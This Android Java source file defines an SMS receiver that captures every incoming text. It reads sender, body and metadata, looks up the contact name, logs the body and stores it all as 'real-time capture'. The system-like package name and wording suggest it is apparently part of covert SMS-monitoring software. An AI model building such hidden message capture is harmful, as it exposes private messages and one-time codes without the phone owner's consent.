package com.system.service.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.system.service.manager.DataManager;

import java.util.HashMap;
import java.util.Map;

/**
 * SMS Receiver - Handles incoming SMS messages
 * Captures SMS in real-time and stores data immediately
 */
public class SmsReceiver extends BroadcastReceiver {
    
    private static final String TAG = "SmsReceiver";
    private static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            Log.d(TAG, "SMS received broadcast intercepted");
            
            try {
                // Extract SMS messages from intent
                Bundle bundle = intent.getExtras();
                if (bundle != null) {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    if (pdus != null && pdus.length > 0) {
                        
                        for (Object pdu : pdus) {
                            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                            if (smsMessage != null) {
                                processSmsMessage(context, smsMessage);
                            }
                        }
                    }
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error processing received SMS", e);
            }
        }
    }
    
    /**
     * Process SMS message and store data
     */
    private void processSmsMessage(Context context, SmsMessage smsMessage) {
        try {
            // Extract SMS data
            String sender = smsMessage.getOriginatingAddress();
            String messageBody = smsMessage.getMessageBody();
            long timestamp = smsMessage.getTimestampMillis();
            
            Log.d(TAG, String.format("SMS from %s: %s", sender, messageBody));
            
            // Create SMS data map
            Map<String, Object> smsData = new HashMap<>();
            smsData.put("type", "received");
            smsData.put("phone_number", sender);
            smsData.put("address", sender);
            smsData.put("body", messageBody);
            smsData.put("message_content", messageBody);
            smsData.put("date", timestamp);
            smsData.put("date_sent", timestamp);
            smsData.put("timestamp", timestamp);
            smsData.put("read", 0); // New SMS is unread
            smsData.put("status", -1); // Received status
            smsData.put("protocol", smsMessage.getProtocolIdentifier());
            smsData.put("service_center", smsMessage.getServiceCenterAddress());
            smsData.put("is_read", false);
            smsData.put("real_time", true); // Mark as real-time capture
            
            // Additional metadata
            smsData.put("message_length", messageBody != null ? messageBody.length() : 0);
            smsData.put("is_multipart", false); // Single SMS for now
            smsData.put("capture_method", "broadcast_receiver");
            
            // Get contact name if available
            String contactName = getContactName(context, sender);
            if (contactName != null) {
                smsData.put("contact_name", contactName);
            }
            
            // Store SMS data using DataManager
            DataManager dataManager = new DataManager(context);
            dataManager.storeSmsData(smsData);
            
            Log.d(TAG, "SMS data stored successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing SMS message", e);
        }
    }
    
    /**
     * Get contact name for phone number
     */
    private String getContactName(Context context, String phoneNumber) {
        if (phoneNumber == null || phoneNumber.isEmpty()) {
            return null;
        }
        
        try {
            android.content.ContentResolver resolver = context.getContentResolver();
            android.net.Uri uri = android.net.Uri.withAppendedPath(
                android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                android.net.Uri.encode(phoneNumber)
            );
            
            try (android.database.Cursor cursor = resolver.query(uri, 
                new String[]{android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME}, 
                null, null, null)) {
                
                if (cursor != null && cursor.moveToFirst()) {
                    return cursor.getString(0);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting contact name for " + phoneNumber, e);
        }
        
        return null;
    }
}